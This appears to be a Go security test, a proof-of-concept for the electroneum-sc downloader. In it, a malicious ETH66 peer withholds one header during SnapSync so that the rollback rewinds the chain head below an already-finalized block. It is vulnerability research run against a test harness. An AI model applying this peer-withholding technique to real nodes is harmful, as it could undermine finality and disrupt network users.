// Reverse Worker R — peer-driven downloader rollback versus finalized metadata.
// Copy ONLY to certified-source scratch eth/downloader package.
//
// Hypothesis: a lower-trust ETH66 peer can trigger SnapSync header safety rollback
// below an already-finalized local block because downloader's chain interface has
// SetHead but no finalized-height query. This test uses the production downloader
// state machine and an actual *core.BlockChain; ethash.NewFaker is only the existing
// deterministic test consensus engine, so this does not by itself prove a QBFT
// finality break on a production validator.
package downloader

import (
    "testing"

    "github.com/electroneum/electroneum-sc/eth/protocols/eth"
)

func TestReverseDPeerDrivenRollbackCrossesFinalizedMarker(t *testing.T) {
    tester := newTester(t)
    defer tester.terminate()

    // Establish a healthy local canonical chain on fork A. This exact shortened
    // chain is pregenerated by downloader/testchain_test.go.
    localLen := len(testChainBase.blocks) + 80
    local := testChainForkLightA.shorten(localLen)
    tester.newPeer("honest", eth.ETH66, local.blocks[1:])
    if err := tester.sync("honest", nil, FullSync); err != nil {
        t.Fatalf("honest baseline sync failed: %v", err)
    }
    wantHead := local.blocks[len(local.blocks)-1].NumberU64()
    if got := tester.chain.CurrentBlock().NumberU64(); got != wantHead {
        t.Fatalf("baseline head=%d want=%d", got, wantHead)
    }

    // Finalize well inside fork A but above the A/B common ancestor.
    // Fork A and B share testChainBase and diverge after it.
    finalizedHeight := uint64(len(testChainBase.blocks) + 40)
    finalized := tester.chain.GetBlockByNumber(finalizedHeight)
    if finalized == nil {
        t.Fatalf("missing baseline finalized block %d", finalizedHeight)
    }
    tester.chain.SetFinalized(finalized)
    if got := tester.chain.CurrentFinalizedBlock(); got == nil || got.NumberU64() != finalizedHeight {
        t.Fatalf("finalized baseline mismatch: %v", got)
    }

    // Remove the honest filler so the attacking origin peer alone controls the
    // fork-B header responses used by this synchronization.
    tester.dropPeer("honest")

    // Fork B has a much longer advertised chain, but shares only the base prefix.
    // Withhold the first header just beyond one MaxHeaderFetch-sized successful
    // region. The production SnapSync rollback safety net then owns whether the
    // already-inserted uncertain header segment is rewound.
    attacker := tester.newPeer("attack", eth.ETH66, testChainForkLightB.blocks[1:])
    missing := len(testChainBase.blocks) + MaxHeaderFetch + 1
    if missing >= len(testChainForkLightB.blocks) {
        t.Fatalf("fixture missing index %d beyond fork-B length %d", missing, len(testChainForkLightB.blocks))
    }
    attacker.withholdHeaders[testChainForkLightB.blocks[missing].Hash()] = struct{}{}

    err := tester.sync("attack", nil, SnapSync)
    if err == nil {
        t.Fatal("malicious/incomplete peer synchronization unexpectedly succeeded")
    }

    head := tester.chain.CurrentBlock().NumberU64()
    final := tester.chain.CurrentFinalizedBlock()
    t.Logf("REVERSE_D_PEER_ROLLBACK_CHARACTERIZATION sync_err=%v baseline_head=%d post_head=%d finalized=%d missing=%d",
        err, wantHead, head, finalizedHeight, missing)

    // This is the security-relevant crossing: the network-driven downloader
    // transition invoked the real BlockChain.SetHead far enough to put current
    // canonical head below the node's pre-existing finalized marker.
    if head >= finalizedHeight {
        t.Fatalf("REVERSE_D_PEER_FINALITY_CROSSING_NOT_REPRODUCED post_head=%d finalized=%d", head, finalizedHeight)
    }
    if final == nil || final.NumberU64() <= head {
        t.Fatalf("REVERSE_D_PEER_FINALIZED_POINTER_NOT_STALE post_head=%d finalized_ptr=%v", head, final)
    }
    t.Logf("REVERSE_D_PEER_DRIVEN_REWIND_BELOW_FINALIZED_OBSERVED post_head=%d finalized_ptr=%d delta=%d",
        head, final.NumberU64(), final.NumberU64()-head)
}
